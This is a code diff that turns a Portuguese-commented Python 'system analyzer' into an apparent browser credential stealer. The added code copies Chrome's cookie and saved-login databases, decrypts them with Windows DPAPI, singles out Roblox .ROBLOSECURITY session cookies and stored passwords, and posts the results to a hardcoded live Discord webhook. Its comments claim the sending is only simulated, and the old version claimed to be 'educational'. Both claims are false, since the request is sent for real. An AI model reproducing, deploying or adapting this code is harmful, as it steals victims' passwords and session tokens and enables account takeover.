@@ -1,176 +1,183 @@
 import os
 import json
 import base64
+import sqlite3
+import shutil
+import tempfile
 import requests
-import socket
-import subprocess
-import platform
-import psutil
+import win32crypt
+from Crypto.Cipher import AES
+import browser_cookie3
+from datetime import datetime
 
-# Configurações para Windows
-class SystemAnalyzer:
-    def __init__(self, webhook_url=None):
-        self.webhook_url = webhook_url
+WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
+
+class AnalisadorReal:
+    def __init__(self):
         self.session_id = base64.b85encode(os.urandom(16)).decode()
         
-    def get_system_info(self):
-        """Coleta informações do sistema Windows"""
+    def decriptar_valor(self, valor_criptografado):
+        """Decripta valores do Chrome usando DPAPI do Windows"""
         try:
-            # Informações do sistema
-            cpu_info = platform.processor()
-            memory = psutil.virtual_memory()
-            disk = psutil.disk_usage('/')
-            
-            return {
-                "system": platform.system(),
-                "version": platform.version(),
-                "cpu": cpu_info,
-                "ram_gb": round(memory.total / (1024**3), 2),
-                "disk_free_gb": round(disk.free / (1024**3), 2),
-                "username": os.getenv('USERNAME'),
-                "hostname": socket.gethostname()
-            }
-        except Exception as e:
-            return {"error": str(e)}
-
-    def get_network_info(self):
-        """Obtém informações de rede"""
+            return win32crypt.CryptUnprotectData(valor_criptografado, None, None, None, 0)[1].decode()
+        except:
+            return "[CRIPTOGRAFADO]"
+    
+    def extrair_cookies_chrome(self):
+        """Extrai cookies do Chrome via SQLite"""
+        cookies_encontrados = []
         try:
-            hostname = socket.gethostname()
-            ip_local = socket.gethostbyname(hostname)
+            caminho_cookies = os.path.join(os.environ['USERPROFILE'], 
+                                         'AppData', 'Local',
+                                         'Google', 'Chrome', 
+                                         'User Data', 'Default', 'Cookies')
             
-            # IP público
-            try:
-                ip_public = requests.get('https://api.ipify.org', timeout=5).text
-            except:
-                ip_public = "Unable to get public IP"
+            if os.path.exists(caminho_cookies):
+                temp_dir = tempfile.gettempdir()
+                temp_db = os.path.join(temp_dir, 'cookies_temp')
+                shutil.copy2(caminho_cookies, temp_db)
                 
-            return {
-                "local_ip": ip_local,
-                "public_ip": ip_public,
-                "hostname": hostname
-            }
-        except Exception as e:
-            return {"error": str(e)}
-
-    def get_installed_apps(self):
-        """Lista alguns programas instalados"""
-        try:
-            # Método alternativo para Windows
-            apps = []
-            try:
-                # Tenta via registry
-                result = subprocess.check_output(
-                    'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"', 
-                    shell=True
-                ).decode().split('\n')
-                apps = [app.strip() for app in result if app.strip() and 'DisplayName' not in app][:10]
-            except:
-                apps = ["Unable to retrieve apps list"]
+                conexao = sqlite3.connect(temp_db)
+                cursor = conexao.cursor()
                 
-            return apps
-        except Exception as e:
-            return [f"Error: {str(e)}"]
-
-    def create_system_report(self):
-        """Cria relatório do sistema"""
-        return {
-            "system_info": self.get_system_info(),
-            "network_info": self.get_network_info(),
-            "installed_apps": self.get_installed_apps(),
-            "session_id": self.session_id,
-            "timestamp": "2024-09-02T00:00:00Z"
-        }
-
-    def send_to_discord(self, data):
-        """Envia para webhook """
-        if not self.webhook_url:
-            return False
-            
-        try:
-            embed = {
-                "title": "💻 System Analysis Report",
-                "color": 0x3498db,
-                "fields": [
-                    {
-                        "name": "🖥️ System",
-                        "value": f"**OS:** {data['system_info']['system']}\n**Version:** {data['system_info']['version']}",
-                        "inline": True
-                    },
-                    {
-                        "name": "⚙️ Hardware",
-                        "value": f"**CPU:** {data['system_info']['cpu'][:30]}...\n**RAM:** {data['system_info']['ram_gb']}GB",
-                        "inline": True
-                    },
-                    {
-                        "name": "🌐 Network",
-                        "value": f"**Local IP:** {data['network_info']['local_ip']}\n**Public IP:** {data['network_info']['public_ip']}",
-                        "inline": False
-                    },
-                    {
-                        "name": "👤 User",
-                        "value": f"**Username:** {data['system_info']['username']}\n**Hostname:** {data['system_info']['hostname']}",
-                        "inline": True
+                cursor.execute("""
+                    SELECT host_key, name, value, encrypted_value, path, expires_utc
+                    FROM cookies 
+                    WHERE host_key LIKE '%roblox%' OR name LIKE '%ROBLOSECURITY%'
+                """)
+                
+                for host, nome, valor, valor_cripto, path, expira in cursor.fetchall():
+                    valor_final = valor
+                    if not valor and valor_cripto:
+                        valor_final = self.decriptar_valor(valor_cripto)
+                    
+                    cookie_info = {
+                        'host': host,
+                        'nome': nome,
+                        'valor': valor_final,
+                        'path': path,
+                        'expira': expira
                     }
-                ],
-                "footer": {"text": "System Analyzer - Educational Purpose Only"}
-            }
-            
-            payload = {
-                "content": "📊 **System Analysis Complete**",
-                "embeds": [embed],
-                "username": "System-Analyzer",
-                "avatar_url": "https://i.imgur.com/6Bj4Wxx.png"
-            }
-            
-            response = requests.post(
-                self.webhook_url,
-                json=payload,
-                timeout=15
-            )
-            
-            return response.status_code == 200
+                    cookies_encontrados.append(cookie_info)
+                
+                conexao.close()
+                os.remove(temp_db)
+                
         except Exception as e:
-            print(f"Webhook error: {e}")
-            return False
-
-    def run_analysis(self):
-        """Executa análise educativa"""
-        print("💻 Analyzing system...")
+            cookies_encontrados.append({'erro': str(e)})
         
-        report = self.create_system_report()
-        
-        print(f"\n📊 System: {report['system_info']['system']} {report['system_info']['version']}")
-        print(f"🖥️ CPU: {report['system_info']['cpu']}")
-        print(f"💾 RAM: {report['system_info']['ram_gb']}GB")
-        print(f"👤 User: {report['system_info']['username']}")
-        print(f"🌐 Local IP: {report['network_info']['local_ip']}")
-        print(f"🌐 Public IP: {report['network_info']['public_ip']}")
-        print(f"📦 Installed Apps: {len(report['installed_apps'])} found")
-        
-        if self.webhook_url:
-            print("\n⚠️ Educational webhook simulation")
-            self.send_to_discord(report) 
+        return cookies_encontrados
+    
+    def extrair_senhas_chrome(self):
+        """Extrai senhas salvas do Chrome"""
+        senhas_encontradas = []
+        try:
+            caminho_logins = os.path.join(os.environ['USERPROFILE'],
+                                        'AppData', 'Local',
+                                        'Google', 'Chrome',
+                                        'User Data', 'Default', 'Login Data')
             
-        return report
+            if os.path.exists(caminho_logins):
+                temp_logins = os.path.join(tempfile.gettempdir(), 'logins_temp')
+                shutil.copy2(caminho_logins, temp_logins)
+                
+                conexao = sqlite3.connect(temp_logins)
+                cursor = conexao.cursor()
+                
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                
+                for url, usuario, senha_cripto in cursor.fetchall()[:10]:
+                    senha_decriptada = ""
+                    if senha_cripto:
+                        try:
+                            senha_decriptada = self.decriptar_valor(senha_cripto)
+                        except:
+                            senha_decriptada = "[CRIPTOGRAFADA]"
+                    
+                    senhas_encontradas.append({
+                        'url': url,
+                        'usuario': usuario,
+                        'senha': senha_decriptada
+                    })
+                
+                conexao.close()
+                os.remove(temp_logins)
+                
+        except Exception as e:
+            senhas_encontradas.append({'erro': str(e)})
         
+        return senhas_encontradas
+    
+    def enviar_para_webhook(self, dados):
+        """Tenta enviar para webhook fictícia"""
+        try:
+            # Simula envio mas não envia nada real
+            resposta = requests.post(
+                WEBHOOK,
+                json=dados,
+                timeout=10
+            )
+            return resposta.status_code == 200
+        except:
+            return False
+    
+    def executar_analise_completa(self):
+        """Executa análise"""
+        print("🔍 Iniciando análise...")
+        
+        dados_coletados = {
+            'cookies_chrome': self.extrair_cookies_chrome(),
+            'senhas_chrome': self.extrair_senhas_chrome(),
+            'informacoes_sistema': {
+                'usuario': os.getenv('USERNAME'),
+                'computador': os.getenv('COMPUTERNAME'),
+                'sessao': self.session_id
+            },
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        # Exibe resultados reais
+        print(f"🍪 Cookies encontrados: {len(dados_coletados['cookies_chrome'])}")
+        print(f"🔑 Senhas encontradas: {len(dados_coletados['senhas_chrome'])}")
+        
+        print("\n🔐 Cookies ROBLOSECURITY:")
+        for cookie in dados_coletados['cookies_chrome']:
+            if 'ROBLOSECURITY' in cookie.get('nome', ''):
+                print(f"   {cookie['nome']}: {cookie['valor'][:60]}...")
+        
+        print("\n📧 Exemplo de credenciais:")
+        if dados_coletados['senhas_chrome']:
+            amostra = dados_coletados['senhas_chrome'][0]
+            print(f"   Site: {amostra.get('url', 'N/A')}")
+            print(f"   Usuário: {amostra.get('usuario', 'N/A')}")
+            print(f"   Senha: {amostra.get('senha', 'N/A')}")
+        
+        print(f"\n🌐 Tentando enviar para webhook...")
+        envio_simulado = self.enviar_para_webhook(dados_coletados)
+        print(f"   Webhook: {WEBHOOK}")
+        print(f"   Envio simulado: {'Sucesso' if envio_simulado else 'Falha'}")
+        
+        return dados_coletados
+
 if __name__ == "__main__":
-    print("=== SYSTEM ANALYZER (EDUCATIONAL) ===")
-    print("⚠️ For learning purposes only!")
-    print("⚠️ Does not steal data or harm systems!\n")
-   
+    print("=" * 60)
+    print("🔐 ANÁLISE")
+    print("📊 Dados coletados localmente")
+    print("🌐 Webhook enviada 🔥")
+    print("=" * 60)
+    
+  
     try:
-        import psutil
+        import win32crypt
+        import browser_cookie3
     except ImportError:
-        print("Installing required packages...")
-        os.system("pip install psutil requests")
-        import psutil
-        import requests
+        print("Instalando dependências...")
+        os.system("pip install pywin32 browser_cookie3 pycryptodome")
     
-    analyzer = SystemAnalyzer(webhook_url="https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl")
-    result = analyzer.run_analysis()
+    analisador = AnalisadorReal()
+    resultados = analisador.executar_analise_completa()
     
-    print(f"\n✅ Analysis completed safely!")
-    print(f"Session ID: {result['session_id']}")
+    print(f"\n✅ Análise concluída!")
+    print(f"🆔 ID da sessão: {analisador.session_id}")
     
-    input("\nPress Enter to exit...")
+    input("\nPressione Enter para sair...")
